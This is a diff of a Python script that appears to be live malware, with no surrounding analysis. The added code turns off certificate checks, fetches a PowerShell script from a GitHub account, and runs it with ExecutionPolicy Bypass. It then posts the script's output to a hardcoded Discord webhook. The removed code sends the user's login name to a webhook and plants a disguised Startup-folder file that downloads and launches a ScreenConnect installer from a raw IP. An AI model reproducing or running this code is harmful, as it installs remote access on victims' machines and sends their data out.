@@ -1,40 +1,44 @@
+import urllib.request
+import subprocess
+import tempfile
 import os
 import json
-import urllib.request
+import ssl
+
+WEBHOOK_URL = 'https://discord.com/api/webhooks/1421777351263522886/5bDMcVkeMYaC16qHofB8ucS0qX9t_IyaBkCz9Q0tjZGJypVmzG-2lAj7q7QOgFLnI7AD'
+SCRIPT_URL = 'https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/1.ps1'
+
+ssl._create_default_https_context = ssl._create_unverified_context
+
+def send_discord_notification(message, color=0x00FF00):
+    payload = json.dumps({'embeds': [{'description': message, 'color': color}]})
+    headers = {'Content-Type': 'application/json'}
+    req = urllib.request.Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
+    try:
+        urllib.request.urlopen(req)
+    except:
+        pass
 
 try:
-    url = 'https://discord.com/api/webhooks/1419779190399569940/TTmoY4jWra0wwRca21U8RIEvesch8duCqnCcQxxDF28i1UNCB09oDOZ3FVVMwJW-5oK2'
-    data = {'content': f'Ran by {os.getlogin()}'}
-    headers = {
-        'Content-Type': 'application/json',
-        'User-Agent': 'Mozilla/5.0'
-    }
-    req = urllib.request.Request(url, data=json.dumps(data).encode(), headers=headers)
-    urllib.request.urlopen(req)
-except Exception as e:
-    print(e)
+    with urllib.request.urlopen(SCRIPT_URL) as response:
+        script_content = response.read()
+except:
+    send_discord_notification('Failed to download script', 0xFF0000)
+    exit(1)
 
-code = """
-import urllib.request
-import json 
-import os
-import tempfile
+with tempfile.NamedTemporaryFile(delete=False, suffix='.ps1') as temp_file:
+    temp_file.write(script_content)
+    temp_file_path = temp_file.name
 
-def download_and_run(url):
-    temp_dir = tempfile.gettempdir()
-    file_path = os.path.join(temp_dir, 'OneDriveSetup3.1.msi')
-    with urllib.request.urlopen(url) as response, open(file_path, 'wb') as out_file:
-        while True:
-            chunk = response.read(8192)
-            if not chunk:
-                break
-            out_file.write(chunk)
-    os.startfile(file_path)
-
-url = 'http://87.121.84.32:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest'
-download_and_run(url)
-"""
-
-startup = os.path.join(os.environ['APPDATA'], r'Microsoft\Windows\Start Menu\Programs\Startup')
-with open(os.path.join(startup, 'Python311UpdateCheck.pyw'), 'w') as f:
-    f.write(code)
+try:
+    result = subprocess.run(
+        ['powershell', '-ExecutionPolicy', 'Bypass', '-File', temp_file_path],
+        capture_output=True,
+        text=True
+    )
+    if result.returncode == 0:
+        send_discord_notification('Script executed successfully\n' + result.stdout, 0x00FF00)
+    else:
+        send_discord_notification('Script failed\n' + result.stderr, 0xFF0000)
+finally:
+    os.unlink(temp_file_path)
